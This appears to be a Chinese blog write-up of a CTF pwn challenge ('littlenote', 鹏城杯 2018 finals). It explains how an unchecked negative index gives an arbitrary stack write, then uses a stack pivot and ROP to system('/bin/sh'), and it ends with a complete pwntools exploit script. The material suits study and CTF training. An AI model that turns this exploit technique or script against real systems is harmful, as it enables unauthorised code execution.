---
title: 鹏城杯 2018 决赛 day2 littlenote writeup
date: 2018-12-10 21:31:44
tags: [pwn, ctf, "鹏城杯", writeup]
---
在经历了第一天宕机5小时后，第二天出现了patch交不上去的状况。导致莫名其妙丢了一千多分，不然前二十还是有的。下面是第二天littlenote题目的writeup
<!--- more --->
## 题目分析
主要漏洞在触发`hacksys`函数，进入`hacker`函数，逻辑出现bug
```
.text:00000000004009A1                 mov     rax, qword ptr [rbp+var_74+4]
.text:00000000004009A5                 cmp     rax, 9
.text:00000000004009A9                 jle     short loc_4009B5
.text:00000000004009AB                 mov     edi, 0
.text:00000000004009B0                 call    _exit
```
这里只验证了输入不能超过9，但是负数没有进行验证，所以可以用复数来对栈进行任意地址写。

根据逻辑
```
mov     [rbp+rax*8-0x60], rdx
```
让rax（第一次读入的id）= -0x8000000000000000 + (0x60 / 8) 即可写到rbp
然后利用
```
leave
retn
```
指令进行栈迁移和rop。
## Solution
这题的难点在于没有leak点（我没找到）。所以只能利用没开PIE的特点，把`/bin/sh`写到bss段上。这里我们利用这样的片段来实现我们的目的
```
.text:0000000000400CFC                 lea     rax, [rbp-0x20]
.text:0000000000400D00                 mov     rsi, rax
.text:0000000000400D03                 mov     edi, offset a9s ; "%9s"
.text:0000000000400D08                 mov     eax, 0
.text:0000000000400D0D                 call    ___isoc99_scanf
```
这里就要提到神奇的`lea`指令了，有兴趣的同学可以自己去试试，通过这一条指令我们就能把`/bin/sh`写到bss段的开头。
接下来就简单了，由于这个片段的下面又是hacker函数，所以可以进行第二段rop。栈的布局如下

第一阶段：
1. `0x602110` 0x6020e0 + 0x20
2. `0x400cfc` 返回地址
3. `0x400fcf` 凑数的
4. `0x0000000900000000` 终止这次读入，强迫症

第二阶段：
1. `0x400e93` pop rdi gedget
2. `0x6020e0` 上面写入的`/bin/sh`的地址
3. `0x40090f` 程序自带了system，跳转到即可
4. `0x0000000900000000`终止这次读入，强迫症

然后就能get shell了

## 感想
这题难点在我傻逼，想得蛮好的，调的时候忘了`send("/bin/sh")`然后卡了一小时，真是蠢爆了。
ps：这题patch交不上去，白丢了800+分

## 脚本
```python
#! /usr/bin/env python2
# Author: 850
from pwn import *
import os


class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        self.elf = ELF(self.elf_name)
        context(os='linux', log_level='info')
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        try remote exploit
        """
        self.target = remote(self.rhost, self.rport)


    def add(self, note, keep):
        """
        not used
        """
        self.target.sendlineafter("Your choice:", "1")
        self.target.sendlineafter("Enter your note", note)
        self.target.sendlineafter("Want to keep your note?", keep)
        self.target.recvuntil("Done")

    def hacker(self, admin_name, index, age):
        self.target.sendlineafter("Your choice:", "5")
        self.target.sendlineafter("Enter administrator's name:", admin_name)
        for i in xrange(len(index)):
            self.target.sendlineafter("Enter hacker index:", str(index[i]))
            self.target.sendlineafter("Enter hacker age:", str(age[i]))

    def run(self,):
        rbp_addr = -0x8000000000000000 + 12
        self.hacker("A"*8, [rbp_addr, rbp_addr + 1, rbp_addr + 2, -3], [0x6020e0 + 0x20, 0x400cfc, 0x400cfc, 0x0000000900000000])

        pop_rdi = 0x400e93
        self.target.sendline("/bin/sh")
        self.target.sendlineafter("Enter hacker index:", str(rbp_addr + 1))
        self.target.sendlineafter("Enter hacker age:", str(pop_rdi))
        self.target.sendlineafter("Enter hacker index:", str(rbp_addr + 2))
        self.target.sendlineafter("Enter hacker age:", str(0x6020e0))
        self.target.sendlineafter("Enter hacker index:", str(rbp_addr + 3))
        self.target.sendlineafter("Enter hacker age:", str(0x40090f))
        self.target.sendlineafter("Enter hacker index:", str(-3))
        self.target.sendlineafter("Enter hacker age:", str(0x0000000900000000))

        self.target.interactive()

solve = BASE(
    remote_host="172.91.0.101",
    remote_port=8088,
    local_elf="./littlenote",
    _remote_libc="./libc.so.6",
    _local_libc="/lib64/libc.so.6",
    gdb_script="b *0x400a1a\nb *0x4009bd"
)

solve.local_debug(gdb_attach = False)
# solve.remote_attack()
solve.run()
```